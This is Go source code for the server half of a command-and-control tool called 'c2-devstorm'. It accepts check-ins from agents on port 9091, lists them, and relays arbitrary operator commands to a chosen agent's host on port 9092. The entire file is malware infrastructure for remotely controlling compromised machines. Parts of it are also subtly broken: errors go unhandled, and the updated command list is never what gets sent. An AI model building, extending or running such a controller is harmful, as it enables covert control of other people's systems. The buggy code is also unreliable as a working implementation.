package main

import (
	"bufio"
	"c2-devstorm/commons"
	"encoding/gob"
	"log"
	"net"
	"os"
	"strings"
)

var (
	agents          = []commons.Message{}
	selectedAgent   string
	listenerPort    = "9091"
	agentConnection net.Conn
)

func main() {
	log.Println("Started.")
	go startListener(listenerPort)
	handleCLI()
}

func startListener(port string) {
	listener, _ := net.Listen("tcp", "0.0.0.0:"+port)
	defer listener.Close()

	for {
		connection, _ := listener.Accept()
		go handleConnection(connection)
	}
}

func handleConnection(connection net.Conn) {
	var message commons.Message
	gob.NewDecoder(connection).Decode(&message)
	agents = append(agents, message)
	connection.Close()
}

func handleCLI() {
	for {
		displayPrompt()
		input := readInput()
		command := parseInput(input)
		baseCommand := command[0]

		if len(baseCommand) > 0 {
			executeCommand(baseCommand, command)
		}
	}
}

func displayPrompt() {
	if selectedAgent != "" {
		print(selectedAgent + "[c2-devstorm]#")
	} else {
		print("[c2-devstorm]")
	}
}

func readInput() string {
	reader := bufio.NewReader(os.Stdin)
	input, _ := reader.ReadString('\n')
	return strings.TrimSuffix(input, "\n")
}

func parseInput(input string) []string {
	return strings.Split(strings.TrimSpace(input), " ")
}

func executeCommand(baseCommand string, command []string) {
	switch baseCommand {
	case "show":
		showCommand(command)
	case "select":
		selectCommand(command)
	default:
		executeSelectedAgentCommand(baseCommand, command)
	}
}

func selectCommand(command []string) {
	if len(command) > 1 {
		selectedAgent = command[1]
	} else {
		log.Println("Unknown command.")
	}

}

func executeSelectedAgentCommand(baseCommand string, command []string) {
	if selectedAgent != "" {
		completeCommand := strings.Join(command, " ")
		c := &commons.Commands{Command: completeCommand}

		updateAgentAndSendCommand(selectedAgent, c)
	} else {
		log.Println("Unknown command.")
	}
}

func updateAgentAndSendCommand(agentID string, command *commons.Commands) {
	for index, message := range agents {
		if message.AgentID == agentID {
			agents[index].Commands = append(agents[index].Commands, *command)
			agentConnection = connectToAgent(message.AgentHostname + ":9092")

			gob.NewEncoder(agentConnection).Encode(message)
			gob.NewDecoder(agentConnection).Decode(message)
		}
	}
}

func connectToAgent(address string) net.Conn {
	conn, _ := net.Dial("tcp", address)
	return conn
}

func showCommand(command []string) {
	if len(command) > 1 {
		switch command[1] {
		case "agents":
			displayAgentList()
		default:
			log.Println("Unknown command.")
		}
	}
}

func displayAgentList() {
	for _, message := range agents {
		log.Println(message.AgentID + " " + message.AgentHostname)
	}
}
